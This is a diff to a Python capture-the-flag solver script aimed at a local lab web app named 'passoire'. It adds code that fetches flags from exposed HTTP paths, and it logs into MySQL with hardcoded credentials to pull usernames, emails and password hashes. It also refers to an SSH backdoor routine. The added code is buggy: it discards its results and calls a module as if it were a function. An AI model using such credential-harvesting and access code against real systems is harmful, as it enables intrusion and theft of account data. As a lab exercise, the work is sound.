@@ -1,6 +1,10 @@
+from distutils.command.config import config
+from idlelib.query import Query
 from sys import flags
 
 import paramiko
+import requests
+import mysql.connector
 
 def ssh_backdoor():
     print("\033[1;32mTrying to get flags using SSH backdoor...\033[0m")
@@ -244,7 +248,101 @@ def ssh_backdoor():
 
 def http_get():
     print("\033[1;32mTrying to get flags using HTTP GET...\033[0m")
-    # TODO
+    
+    flags = {}
+    
+    # ============================
+    # Flag 3
+    # ============================
+    # http get http://localhost:10080/passoire/flag_3
+    r = requests.get('http://localhost:10080/passoire/flag_3')
+    if r.status_code == 200:
+        flag = r.text.split('\n')[0].split(" ")[-1].replace(".", "")
+        print(f"Flag 3: {flag}")
+        flags['flag_3'] = flag
+    else:
+        print("\033[1;31mFlag 3 not found\033[0m")
+        
+    # ============================
+    # Flag 4
+    # ============================
+    # http get http://localhost:10080/passoire/index.php, in the source code
+    r = requests.get('http://localhost:10080/passoire/index.php')
+    if r.status_code == 200:
+        lines = r.text.split('\n')
+        flag_4 = ""
+        for line in lines:
+            if "flag_4" in line:
+                flag_4 = line.strip().split(" ")[-1].replace(".", "")
+                break
+        if flag_4:
+            flags['flag_4'] = flag_4
+            print(f"Flag 4: {flags['flag_4']}")
+        else:
+            print("\033[1;31mFlag 4 not found\033[0m")
+    else:
+        print("\033[1;31mFlag 4 not found\033[0m")
+        
+    # ============================
+    # Flag 6
+    # ============================
+    # http get http://localhost:10080/passoire/uploads/flag_6
+    r = requests.get('http://localhost:10080/passoire/uploads/flag_6')
+    if r.status_code == 200:
+        flag = r.text.split('\n')[0].split(" ")[-1].replace(".", "")
+        print(f"Flag 6: {flag}")
+        flags['flag_6'] = flag
+    else:
+        print("\033[1;31mFlag 6 not found\033[0m")
+        
+    # ============================
+    # Flag 7
+    # ============================
+    # http get http://localhost:10080/passoire/uploads/secret
+    r = requests.get('http://localhost:10080/passoire/uploads/secret')
+    if r.status_code == 200:
+        flag = r.text.split('\n')[0].split(" ")[-1].replace(".", "")
+        print(f"Flag 7: {flag}")
+        flags['flag_7'] = flag
+    else:
+        print("\033[1;31mFlag 7 not found\033[0m")
+        
+    # ============================
+    # Flag 10
+    # ============================
+    # http post http://localhost:13002/flag
+    r = requests.post('http://localhost:13002/flag')
+    if r.status_code == 200:
+        flag = r.text.split('\n')[0].split(" ")[-1].replace(".", "").replace("\"", "").replace("}", "")
+        print(f"Flag 10: {flag}")
+        flags['flag_10'] = flag
+    else:
+        print("\033[1;31mFlag 10 not found\033[0m")
+    
+    
+    return {}
+
+def sql():
+    print("\033[1;32mTrying to get flags using MySQL...\033[0m")
+    config = {
+        'user': "passoire",
+        'password': "gandalf",
+        'host': "localhost",
+        'port': 13306,
+        'database' : "passoire",
+    }
+    try:
+        connection= mysql.connector.connect(**config)
+        cursor = connection.cursor()
+        query = "SELECT login, email, pwhash FROM users WHERE login like 'flag_%';"
+        cursor.execute(query)
+    except mysql.connector.Error as e:
+        print(f"\033[1;31mError: {e}\033[0m")
+    finally:
+        if connection.is_connected():
+            cursor.close()
+            connection.close()
+    
     return {}
 
 def hex_to_unicode(hex_string):
@@ -253,5 +351,7 @@ def hex_to_unicode(hex_string):
     return unicode_string
 
 if __name__ == '__main__':
-    flags = ssh_backdoor()
+    #flags = ssh_backdoor()
+    http_get()
     #print(flags)
+    mysql()
